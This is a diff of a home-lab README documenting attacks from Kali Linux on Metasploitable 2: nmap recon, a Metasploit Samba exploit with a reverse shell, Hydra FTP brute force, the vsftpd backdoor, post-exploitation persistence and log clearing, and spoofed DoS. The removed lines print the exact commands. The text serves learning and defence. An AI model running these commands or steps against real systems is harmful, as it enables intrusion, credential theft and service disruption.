@@ -1,314 +1,75 @@
-**Phase 2 — Attacks**
+# Phase 2 — Attacks
 
+## What this phase covers
 
+This is the offensive half of the lab. Using Kali Linux as the attacker machine, I ran real exploitation techniques against Metasploitable 2 — the same categories of attack used in actual penetration tests. Each attack below has its own folder with a full writeup and screenshots.
 
-*What this phase is about?*
+The point was never just to get a shell and stop. For every attack I tried to understand why the vulnerability existed, how a defender would notice it, and what should have been done to prevent it in the first place.
 
+---
 
+## Target
 
-This is where the lab gets interesting. Using Kali Linux as my 
+- Attacker: Kali Linux, `10.0.2.15`
+- Target: Metasploitable 2, `10.0.2.3`
+- Network: isolated VirtualBox NAT Network ("Cyberlab", `10.0.2.0/24`)
 
-attacker machine, I ran real offensive techniques against 
+---
 
-Metasploitable — the same tools and methods used in actual 
+## Attacks
 
-penetration tests.
+### 01 — Network Reconnaissance
+**Folder:** `01-nmap-recon/`
 
+Scanned the target with nmap before touching anything else, to see what ports and services were actually running. This is always step one — you can't exploit what you haven't found.
 
+---
 
-The goal wasn't just to "get root" and move on. For every 
+### 02 — Samba Exploitation
+**Folder:** `02-samba-exploit/`
 
-attack I asked myself three questions:
+Exploited CVE-2007-2447, a flaw in Samba 3.0.20 where the username field during login gets passed unsanitized to the system shell. Sending a crafted username executed arbitrary commands as root — no password needed. Got full root access on the target.
 
-\- Why does this vulnerability exist?
+---
 
-\- How would a defender detect this?
+### 03 — FTP Brute Force
+**Folder:** `03-hydra-bruteforce/`
 
-\- What should have been done to prevent it?
+Used Hydra to automatically try passwords against the FTP service. The target had no account lockout policy and was still using its default credentials (`msfadmin:msfadmin`), so it was cracked in just four attempts.
 
+---
 
+### 04 — Post-Exploitation
+**Folder:** `04-post-exploitation/`
 
-That's the Blue Team mindset I'm building.
+Everything done after getting a root shell on the target: checking what the system actually looks like from the inside, dumping password hashes from `/etc/shadow`, creating a backdoor user to stay in even if the original vulnerability gets patched, checking the ARP cache to see what other machines the box had talked to, and finally clearing local logs to simulate covering tracks — then noting why that doesn't actually work against a SIEM that's already shipped the logs elsewhere.
 
+---
 
+### 05 — vsftpd 2.3.4 Backdoor
+**Folder:** `05-vsftpd-exploit/`
 
-\---
+A different kind of vulnerability than the others. This wasn't a coding mistake — someone broke into the vsftpd project's own download server in 2011 and planted a deliberate backdoor in the source code. Any server running that exact version opens a root shell the moment it sees a username ending in `:)`. Same result as the Samba exploit (instant root, no privilege escalation needed), but the cause is a supply chain compromise rather than a bug.
 
+---
 
+### 06 — Denial of Service
+**Folder:** `06-dos-attack/`
 
-**Target Information**
+Ran a DoS attempt against the target using hping3, flooding it with traffic and watching the effect in Wireshark. One useful mistake here — I set a spoofed source IP (SHOST) for the attack, which meant Wazuh's agent on Kali didn't log anything meaningful, since it only sees Kali's own local activity, not what IP address outbound packets claim to be from. That's a real detection gap worth understanding: host-based agents don't see spoofed traffic the way network-level tools like Wireshark or Suricata do.
 
+---
 
+## Key findings across all attacks
 
-| Field | Detail |
-
-|-------|--------|
-
-| Target IP | 10.0.2.3 (Metasploitable 2) |
-
-| Attacker IP | 10.0.2.15 (Kali Linux 2025.3) |
-
-| Network | Cyberlab (10.0.2.0/24) |
-
-
-
-\---
-
-
-
-**Attack Index**
-
-
-
-**Attack 01 — Network Reconnaissance (Nmap)**
-
-
-
-**What I did :**
-
-Before attacking anything, I needed to know what was running 
-
-on the target. Nmap scans the network and reveals open ports, 
-
-running services, and software versions.
-
-
-
-**Command** :
-
-```bash
-
-sudo nmap -sV -O 10.0.2.3 -oN \~/lab/phase2/scans/metasploitable\_initial.txt
-
-```
-
-
-
-*What the flags mean:*
-
-\- `-sV` — detect service versions on each open port
-
-\- `-O` — attempt to identify the operating system
-
-\- `-oN` — save output to a file for documentation
-
-
-
-*Why this matters:*
-
-Reconnaissance is Step 1 of every real attack. You can't 
-
-exploit what you don't know exists. In a real engagement 
-
-this scan would reveal the attack surface — every open port 
-
-is a potential entry point.
-
-
-
-**MITRE ATT\&CK :** T1046 — Network Service Discovery
-
-
-
-
-
-\---
-
-
-
-\### Attack 02 — Samba Exploitation (Metasploit)
-
-
-
-*What I did:*
-
-
-
-Exploited CVE-2007-2447, a critical vulnerability in Samba 
-
-3.0.20. Got a full root shell on Metasploitable with zero 
-
-authentication.
-
-
-
-*The vulnerability explained:*
-
-
-
-Samba is a service that lets Linux machines share files with 
-
-Windows machines over the network. In version 3.0.20, the 
-
-username field during login was passed directly to /bin/sh 
-
-without being sanitized. This means an attacker can inject 
-
-shell commands through the username field and have them 
-
-executed by the server — as root.
-
-
-
-**Commands** :
-
-```bash
-
-msfconsole
-
-use exploit/multi/samba/usermap\_script
-
-set RHOSTS 10.0.2.3
-
-set PAYLOAD cmd/unix/reverse
-
-set LHOST 10.0.2.15
-
-run
-
-whoami  # output: root
-
-```
-
-
-
-**Result**: Full root shell — complete control of the system
-
-
-
-**CVE**: CVE-2007-2447 | \*\*CVSS:\*\* 10.0 (Critical)
-
-
-
-*How to prevent it:*
-
-
-
-\- Patch Samba — fix has existed since 2007
-
-\- Disable SMB if file sharing isn't needed
-
-\- Firewall port 445 from untrusted networks
-
-\- Never run services as root user
-
-
-
-\*\*MITRE ATT\&CK:\*\* T1190 — Exploit Public-Facing Application
-
-
-
-\---
-
-
-
-**Attack 03 — FTP Brute Force (Hydra)**
-
-
-
-*What I did:*
-
-
-
-Used Hydra to automatically try password combinations against 
-
-the FTP service until finding the correct credentials.
-
-
-
-*The vulnerability explained*:
-
-
-
-Metasploitable runs FTP with default credentials 
-
-(msfadmin:msfadmin) and no account lockout policy. Without 
-
-lockout, an attacker can try unlimited passwords with no 
-
-consequences. Hydra cracked it in 4 attempts.
-
-
-
-**Command**:
-
-```bash
-
-hydra -l msfadmin -P \~/lab/custom-pass.txt 10.0.2.3 ftp -t 4 -V
-
-```
-
-
-
-*What the flags mean*:
-
-
-
-\-> `-l msfadmin` — the username to attack
-
-\-> `-P` — path to password wordlist
-
-\-> `-t 4` — 4 parallel threads
-
-\-> `-V` — verbose, show every attempt
-
-
-
-**Result:** `\[21]\[ftp] host: 10.0.2.3 login: msfadmin password: msfadmin`
-
-
-
-*How to prevent it:*
-
-
-
-\- Never use default credentials
-
-\- Lock accounts after 3-5 failed attempts
-
-\- Replace FTP with SFTP (encrypted)
-
-\- Alert on repeated failed logins in SIEM
-
-
-
-\*\*MITRE ATT\&CK:\*\* T1110.001 — Brute Force: Password Guessing
-
-\---
-
-
-
-***Key Findings***
-
-
-
-| Vulnerability | Severity | Root Cause |
-
-|---------------|----------|------------|
-
-| CVE-2007-2447 (Samba) | Critical | Unpatched 19-year-old software |
-
+| Vulnerability | Severity | Root cause |
+|---|---|---|
+| CVE-2007-2447 (Samba) | Critical | Unpatched, 19-year-old software |
 | Default FTP credentials | High | No password policy enforced |
+| No account lockout | High | Missing basic configuration |
+| CVE-2011-2523 (vsftpd) | Critical | Supply chain compromise, not a bug |
+| Spoofable DoS traffic | Medium | Host-based monitoring alone can't see it |
 
-| No account lockout | High | Missing security configuration |
+## Biggest takeaway
 
-
-
-***Biggest Takeaway***
-
-
-
-Every single vulnerability I exploited today had a known fix. 
-
-The Samba patch came out in 2007. Default credentials are 
-
-preventable by policy. Account lockout is a checkbox in any 
-
-decent system configuration.
-
-
-
-Most real breaches aren't zero-days — they're unpatched 
-
-software and poor configuration. That's what this phase showed me.
-
+Every exploit here except the DoS attempt had a known, published fix years before this lab was built. The Samba patch has existed since 2007. Default credentials and missing lockout policies are a configuration decision, not a zero-day. Most real-world breaches aren't sophisticated — they're exactly this: old software and weak defaults that nobody got around to fixing.
